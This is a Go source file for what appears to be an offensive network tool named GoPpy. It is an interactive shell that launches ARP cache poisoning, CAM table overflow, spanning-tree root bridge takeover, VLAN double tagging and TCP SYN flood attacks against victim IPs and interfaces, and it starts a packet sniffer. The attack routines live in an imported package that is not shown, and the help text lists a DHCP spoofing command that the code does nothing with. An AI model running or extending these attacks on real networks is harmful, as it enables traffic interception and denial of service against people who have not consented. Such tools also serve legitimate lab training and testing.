package main

import (
	"bufio"
	"fmt"
	"github.com/tiagomdiogo/GoPpy/higherlevel"
	"github.com/tiagomdiogo/GoPpy/sniffer"
	"log"
	"os"
	"strconv"
	"strings"
)

func help() {
	fmt.Println("Available commands:")
	fmt.Println("sniff <interface name> - sniffs and shows packets to the desired interface")
	fmt.Println(":")
	fmt.Println("Available attacks:")
	fmt.Println("")
	fmt.Println("There are several developed attacks that you can perform by type the correct commands. The following attacks are available: ")
	fmt.Println("Arp Cache Poisoning - This attack consists of poisoning the victim's ARP table to be able to intercept any communication (MitM)")
	fmt.Println("To perform this attack type: arpcache <interface> <Victim1 IP> <Victim2 IP>")
	fmt.Println("")
	fmt.Println("CAM table overflow - Consists of overflowing the capacity of Cam table of a switch")
	fmt.Println("To perform this attack type: camoverflow <Interface> <Number of packets to be sent>")
	fmt.Println("")
	fmt.Println("Root Bridge takeover - Consists of taking the role of Root bridge on a LAN network")
	fmt.Println("To perform this attack type: rootbridge <Interface>")
	fmt.Println("Root Bridge takeover 2 interfaces - Consists of taking the role of Root bridge with 2 interfaces on a LAN network")
	fmt.Println("To perform this attack type: rootbridge <Interface1> <Interface2>")
	fmt.Println("DHCP Spoofing - Consists of sending spoofed responses with malicious configurations")
	fmt.Println("To perform this attack type: dhcpspoofing <interface>")
	fmt.Println("Double tag - inject malicious data into a network by encapsulating packets with two VLAN tags, deceiving switches and gaining unauthorized access to traffic on different VLANs.")
	fmt.Println("To perform this attack type: doubletag <interface> <victimIP> <VlanOut> <vlanIn>")
	fmt.Println("TCP SYN - Consume server resources by sending SYN requests to make the system unresponsive to legitimate traffic.")
	fmt.Println("tcpsyn <Target IP> <TargetPort>")

}

func main() {

	go sniffer.SniffP("en0", "tcp and port 4343")

	fmt.Println("[*] Welcome to Goppy interactive shell")
	fmt.Println("[*] Too see available commands type the command: help")

	//Creating a simple shell to read commands

	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("$Goppy Shell ")
		cmd, err := reader.ReadString('\n')

		if err != nil {
			log.Fatal(err)
			return
		}
		cmdWords := strings.Fields(cmd)

		if len(cmdWords) == 0 {
			fmt.Println("Please input any instruction")
			continue
		}
		switch cmdWords[0] {
		case "help":
			help()
		case "exit":
			os.Exit(0)
		case "arpcache":
			if len(cmdWords) < 4 {
				fmt.Println("To use arpcache provide the following instructions:")
				fmt.Println("arpcache <interface> <Victim1 IP> <Victim2 IP>")
				continue
			} else {
				higherlevel.ArpMitm(cmdWords[1], cmdWords[2], cmdWords[3])
			}
		case "camoverflow":
			if len(cmdWords) < 3 {
				fmt.Println("To use camoverflow provide the following instructions:")
				fmt.Println("camoverflow <Interface> <Number of packets to be sent>")
				continue
			} else {
				numberofpacket, err := strconv.Atoi(cmdWords[2])
				if err != nil {
					continue
				}
				higherlevel.Cam(cmdWords[1], numberofpacket)
			}
		case "dhcpspoofing":
			continue
		case "doubletag":
			if len(cmdWords) < 5 {
				fmt.Println("To use doubletag provide the following instructions:")
				fmt.Println("doubletag <interface> <victimIP> <VlanOut> <vlanIn>")
				continue
			} else {
				vlanOut, err := strconv.ParseUint(cmdWords[3], 10, 64)
				vlanIn, err := strconv.ParseUint(cmdWords[4], 10, 64)
				if err != nil {
					continue
				}
				higherlevel.DoubleTagVlan(cmdWords[1], cmdWords[2], uint16(vlanOut), uint16(vlanIn))
			}
		case "tcpsyn":
			if len(cmdWords) < 3 {
				fmt.Println("To use tpcsyn provide the following instructions:")
				fmt.Println("tcpsyn <Target IP> <TargetPort> ")
				continue
			} else {
				higherlevel.TCPSYNFlood(cmdWords[1], cmdWords[2], 120)
			}
		case "rootbridge":
			if len(cmdWords) < 2 {
				fmt.Println("To use StpRootBridgeMitM provide the following instructions:")
				fmt.Println("rootbridge <interface>")
				continue
			} else {
				higherlevel.StpRootBridgeMitM(cmdWords[1])
			}
		case "rootbridge2int":
			if len(cmdWords) < 3 {
				fmt.Println("To use rootbridge2int provide the following instructions:")
				fmt.Println("rootbridge2int <interface1> <interface2>")
				continue
			} else {
				higherlevel.StpRootBridgeMitM2(cmdWords[1], cmdWords[2])
			}
		case "sniff":
			if len(cmdWords) < 3 {
				fmt.Println("To use sniff provide the following instructions:")
				fmt.Println("sniff <interface1> <filter>")

			} else {
				go sniffer.SniffP(cmdWords[1], cmdWords[2])
			}
		}

	}
}
